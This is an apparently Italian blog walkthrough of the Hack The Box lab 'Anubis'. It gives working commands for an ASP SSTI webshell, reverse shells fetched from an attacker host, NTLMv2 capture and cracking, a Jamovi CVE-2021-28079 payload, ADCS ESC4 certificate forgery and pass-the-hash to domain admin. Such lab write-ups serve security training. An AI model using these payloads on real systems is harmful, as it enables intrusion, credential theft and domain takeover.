---
title: 'HTB Anubis Walkthrough — ASP SSTI, Jamovi RCE e ADCS ESC4'
slug: htb-anubis-walkthrough
description: 'Walkthrough completo di Hack The Box Anubis (Insane, Windows): ASP SSTI per shell in Docker, CVE-2021-28079 su Jamovi per foothold su host, e privilege escalation via ADCS ESC4 con GenericAll su certificate template.'
image: /htb-anubis-walkthrough-adcs-esc4-asp-ssti.webp
draft: false
date: 2026-06-24T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - hard
tags:
  - walkthrough
  - htb
---

# HTB Anubis Writeup: ASP SSTI, Jamovi CVE-2021-28079 e ADCS ESC4 su Windows Insane

**Difficoltà:** Insane | **OS:** Windows | **IP:** 10.10.11.102

Anubis è una macchina Windows Insane con tre fasi distinte. Si parte da una SSTI su ASP Classic che dà shell in un container Docker. Dall'interno del container si trova una CSR che rivela un hostname interno — e da lì si cattura un hash NTLMv2 che apre l'accesso SMB. Sulla share si trovano file Jamovi vulnerabili a CVE-2021-28079: XSS in ElectronJS → RCE sull'host come diegocruz. La privesc è ADCS ESC4: diegocruz ha GenericAll su un certificate template, lo si modifica aggiungendo gli EKU giusti, si genera un cert per Administrator e ci si autentica via PKINIT.

***

## Recon

Si usa `mynmap` — uno script bash custom che wrappa [nmap](https://nmap.org):

```bash
sudo mynmap 10.10.11.102
```

Risultato: cinque porte aperte — 135 (RPC), 443 (HTTPS), 445 (SMB), 593 (RPC over HTTP), 49721. Niente HTTP diretto, solo HTTPS. Il certificato TLS rivela già il dominio: `www.windcorp.htb`. Da notare subito lo skew dell'orologio segnalato da nmap — circa un'ora. Tornerà utile nella fase di autenticazione Kerberos.

```bash
crackmapexec smb 10.10.11.102
# EARTH | windcorp.htb | Windows 10.0 Build 17763
```

SMB anonimo non restituisce share — serve tornare con credenziali.

***

## VHost enumeration

Con il dominio noto si usa [ffuf](https://hackita.it/articoli/ffuf/) per cercare altri virtual host:

```bash
ffuf -u https://10.10.11.102 -H "Host: FUZZ.windcorp.htb" \
  -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
  -fs 315 -k
```

`-fs 315` esclude le risposte di default — quelle da 315 byte che il server restituisce per qualsiasi vhost inesistente. `-k` ignora l'errore TLS self-signed. Risponde solo `www.windcorp.htb`, che si aggiunge a `/etc/hosts`.

Il sito è una pagina corporate con un form "Contact Us" che invia i dati via GET a `/save.asp` e reindirizza a `/preview.asp`.

***

## ASP SSTI → Shell come SYSTEM in Docker

### Come si arriva alla SSTI

Feroxbuster con estensione `-x asp` trova `test.asp` — una pagina che si aggiorna automaticamente con i dati inviati dal form. Il contenuto del campo `message` viene scritto lì e poi incluso in `preview.asp`.

Il primo tentativo è XSS — `<script>alert(1)</script>` funziona, la pagina esegue il JavaScript. Ma in questo caso non c'è nessun utente che visita la pagina lato server, quindi uno XSS reflected o stored non porta da nessuna parte offensivamente. Per capire quando e perché lo XSS stored è sfruttabile in altri contesti, vedi la [guida su hackita.it](https://hackita.it/articoli/xss-stored/).

L'estensione `.asp` suggerisce altro. ASP Classic processa il codice tra `<% %>` lato server prima di inviare la risposta. Se quell'input finisce scritto in `test.asp` che viene poi incluso nella pagina, qualsiasi payload ASP iniettato viene eseguito dal server — è una SSTI su ASP Classic.

### Webshell

Prima una webshell con comando hardcoded per verificare l'esecuzione:

```asp
<%
Set shell = CreateObject("WScript.Shell")
Set proc = shell.exec("whoami")
Response.Write(proc.StdOut.ReadAll)
%>
```

Risponde `nt authority\system`. Poi si parametrizza:

```asp
<%
Set shell = CreateObject("WScript.Shell")
Set proc = shell.exec(request("cmd"))
Response.Write(proc.StdOut.ReadAll)
%>
```

`preview.asp?cmd=whoami` → `nt authority\system`.

### Reverse shell

```bash
python3 -m http.server 80
rlwrap nc -lnvp 443
```

```asp
<%
Set shell = CreateObject("WScript.Shell")
Set proc = shell.exec("powershell -c curl -usebasicparsing http://10.10.14.X/rev.ps1 | iex")
Response.Write(proc.StdOut.ReadAll)
%>
```

Shell su `webserver01` — hostname e IP interno `172.20.159.137` confermano che si è in un container Docker, non sull'host reale.

***

## CSR leak → softwareportal.windcorp.htb

Sul desktop dell'Administrator del container c'è `req.txt` — una Certificate Signing Request. Si legge con openssl:

```bash
openssl req -in req.txt -noout -text
# CN = softwareportal.windcorp.htb
```

Il dominio non è raggiungibile via DNS dal container, ma il gateway `172.20.144.1` risponde su porta 80 con header `Host: softwareportal.windcorp.htb` — il sito è lì.

***

## NTLMv2 Capture → localadmin

Il software portal interno ha link del tipo:

```
install.asp?client=172.20.159.137&software=VNC.exe
```

Il parametro `client` è l'IP a cui il server si connette via WinRM (porta 5985) per eseguire l'installazione. Si sostituisce con il proprio IP e si avvia Responder:

```bash
responder -I tun0
```

Arriva l'hash NTLMv2 di `windcorp\localadmin`. Si cracca con hashcat mode 5600:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
# localadmin : Secret123
```

CrackMapExec conferma le credenziali valide per SMB.

***

## Kerberoasting — Softwareportal$ (hash non craccato)

Con le credenziali di `localadmin` e il tunnel Chisel già attivo verso la rete interna, si ha accesso alla porta 88 del DC. Questo apre la possibilità di fare kerberoasting.

```bash
impacket-GetUserSPNs windcorp.htb/localadmin:Secret123 -dc-ip 10.10.11.102 -request
```

Il DC restituisce un hash per `Softwareportal$` — il computer account associato al software portal interno. Il problema: l'hash è **AES256** (hashcat mode 19700), non RC4. Questo lo rende estremamente lento da crackare rispetto al classico RC4 (mode 13100).

```bash
hashcat -m 19700 softwareportal.hash /usr/share/wordlists/rockyou.txt
# No match — password troppo complessa o wordlist insufficiente
```

Rockyou non basta. Wordlist più grandi come Kaonashi o weakpass potrebbero teoricamente craccarlo ma con tempi proibitivi. Questo percorso si chiude qui — non porta al foothold sull'host. Vale però la pena documentarlo perché **quasi nessun walkthrough pubblico di Anubis lo menziona**, ed è un ottimo reminder su perché l'AES256 è significativamente più resistente al cracking offline rispetto a RC4.

> Nota: per arrivare a fare kerberoasting su questa box era necessario avere il tunnel verso la rete interna già funzionante — la porta 88 del DC non è esposta direttamente sull'IP pubblico `10.10.11.102`.

***

## Jamovi CVE-2021-28079 → Shell come diegocruz

### Cosa c'è sulla share

```bash
smbclient //10.10.11.102/Shared -U windcorp.htb/localadmin Secret123
```

In `\Documents\Analytics\` ci sono quattro file `.omv`. Jamovi è un software di analisi statistica basato su ElectronJS — i file `.omv` sono archivi ZIP che contengono tra le altre cose `metadata.json`, dove vengono salvati i nomi delle colonne del dataset. `Whatif.omv` ha un timestamp del giorno stesso, gli altri risalgono ad aprile 2021: qualcuno lo apre periodicamente.

### L'exploit

CVE-2021-28079: il campo `name` delle colonne in `metadata.json` non viene sanitizzato. Jamovi lo renderizza come HTML dentro ElectronJS — che a differenza di un browser espone le API di Node.js. XSS in ElectronJS = RCE tramite `require('child_process')`.

Si estrae il file, si modifica `metadata.json`:

```json
{"name": "<script src=\"http://10.10.14.X/payload.js\"></script>"}
```

Si ricrea l'archivio:

```bash
zip -r Whatif.omv .
```

Il `payload.js` lancia il reverse shell:

```javascript
require('child_process').spawn("powershell -e <BASE64_PAYLOAD>")
```

Si carica sulla share SMB e si aspetta. Dopo circa 5 minuti la vittima apre il file — arriva la richiesta sul web server, poi la shell:

```
windcorp\diegocruz
```

`user.txt` è sul desktop.

***

## ADCS ESC4 → Administrator

Per una guida completa su ESC4 — permessi, metodi di exploitation e detection — leggi la [guida dedicata su hackita.it](https://hackita.it/articoli/esc4-adcs/).

### Enumeration

```powershell
certutil -catemplates
# Web: Web -- Auto-Enroll   ← unico accessibile
```

```powershell
.\Certify.exe find /template:Web
```

Output rilevante:

```
msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT
pkiextendedkeyusage         : Server Authentication
Full Control Principals     : WINDCORP\webdevelopers
```

diegocruz è in `webdevelopers` → **GenericAll** sul template. Il template permette di specificare il soggetto del certificato (`ENROLLEE_SUPPLIES_SUBJECT`), ma ha solo Server Authentication come EKU — inutile per autenticarsi come utente AD. Serve aggiungere gli OID giusti. Per capire quali OID contano e perché, vedi la [guida agli EKU OID in ADCS](https://hackita.it/articoli/adcs-eku-oid-offensive/).

### Modifica del template (ESC4)

```powershell
$EKUs = @("1.3.6.1.5.5.7.3.2", "1.3.6.1.4.1.311.20.2.2")
Set-ADObject "CN=Web,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=windcorp,DC=htb" `
  -Add @{pKIExtendedKeyUsage=$EKUs;"msPKI-Certificate-Application-Policy"=$EKUs}
```

Il template ora ha Client Authentication + Smart Card Logon — è ESC1.

### Cert request da Kali

```bash
cat > admin.cnf << EOF
[ req ]
default_bits = 2048
prompt = no
req_extensions = user
distinguished_name = dn

[ dn ]
CN = Administrator

[ user ]
subjectAltName = otherName:msUPN;UTF8:administrator@windcorp.htb
EOF

openssl req -config admin.cnf \
  -subj "/DC=htb/DC=windcorp/CN=Users/CN=Administrator" \
  -new -nodes -sha256 -out administrator.req -keyout administrator.key
```

### Firma dalla CA

Si carica `administrator.req` su Windows e si sottomette:

```powershell
certreq -submit -config "earth.windcorp.htb\windcorp-CA" `
  -attrib "CertificateTemplate:Web" administrator.req administrator.cer
# Certificate retrieved(Issued)
```

### PFX e PKINIT via Ligolo

```bash
openssl pkcs12 -export -in administrator.cer -inkey administrator.key -out administrator.pfx
```

La porta 88 del DC non è raggiungibile direttamente da Kali — è sulla rete interna `172.20.192.0/24`. Ligolo è già attivo dalla shell di diegocruz. Si aggiunge la route:

```bash
sudo ip route add 172.20.192.0/24 dev ligolo
```

```bash
certipy auth -pfx administrator.pfx -dc-ip 172.20.192.1
```

```
[*] Got TGT
[*] Got hash for 'administrator@windcorp.htb': aad3b435b51404eeaad3b435b51404ee:3ccc18280610c6ca3156f995b5899e09
```

TGT + NT hash tramite UnPAC-the-hash, senza toccare LSASS.

```bash
evil-winrm -i earth.windcorp.htb -r windcorp.htb
```

`root.txt` sul desktop di Administrator.

***

## Metodo alternativo — PoshADCS + Rubeus (tutto da Windows)

Il metodo precedente richiede di generare la cert request da Kali e trasferire file avanti e indietro. Esiste un approccio più diretto che rimane interamente su Windows — utile in un engagement reale per ridurre i trasferimenti e il footprint.

Si caricano tre tool su Windows:

```powershell
curl http://10.10.14.X/Rubeus.exe -outfile \programdata\rubeus.exe
curl http://10.10.14.X/PowerView.ps1 | iex
curl http://10.10.14.X/ADCS.ps1 | iex
```

`ADCS.ps1` è **PoshADCS** — uno script PowerShell che automatizza gli attack path su ADCS. Richiede PowerView come dipendenza.

### Genera il cert direttamente nel cert store

```powershell
Get-SmartCardCertificate -Identity Administrator -TemplateName Web -NoSmartCard -Verbose
```

`-NoSmartCard` dice allo script che non c'è una smart card fisica. Il cert viene generato e installato direttamente nel cert store dell'utente corrente — niente openssl, niente certreq, niente trasferimenti.

Si recupera il thumbprint:

```powershell
gci cert:\currentuser\my -recurse
# Thumbprint: 1C7115A30632E82A04A734179759756427247965
```

### Ottieni TGT + NT hash con Rubeus

```powershell
.\rubeus.exe asktgt /user:Administrator /getcredentials /certificate:1C7115A30632E82A04A734179759756427247965
```

Output:

```
[+] TGT request successful!
[*] Getting credentials using U2U
  NTLM : 3CCC18280610C6CA3156F995B5899E09
```

### Shell come SYSTEM

Con l'NT hash si usa `psexec.py` da Kali:

```bash
psexec.py -hashes 3CCC18280610C6CA3156F995B5899E09:3CCC18280610C6CA3156F995B5899E09 administrator@10.10.11.102 cmd.exe
# whoami → nt authority\system
```

Il vantaggio rispetto al metodo manuale: zero file trasferiti da Kali a Windows nella fase finale, tutto rimane nel processo PowerShell. Più veloce, meno rumore.

***

## Attack chain

```
mynmap → ASP SSTI → SYSTEM (Docker webserver01)
    → req.txt → softwareportal.windcorp.htb
    → Responder NTLMv2 → localadmin:Secret123
    → Kerberoasting → Softwareportal$ AES256 → non craccato (dead end)
    → SMB → Whatif.omv → CVE-2021-28079 → diegocruz
    → GenericAll su template Web → ESC4
    → certreq → cert per Administrator
    → Ligolo + PKINIT → TGT + NT hash → root
```

***

## Risorse correlate

* [EKU OID in ADCS: guida offensiva completa — hackita.it](https://hackita.it/articoli/adcs-eku-oid-offensive/)
* [Attacchi ADCS ESC1–ESC16 con Certipy — hackita.it](https://hackita.it/articoli/adcs-esc1-esc16/)
* [CVE-2021-28079 — Jamovi XSS PoC — GitHub](https://github.com/g33xter/CVE-2021-28079)
* [Certified Pre-Owned whitepaper — SpecterOps](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
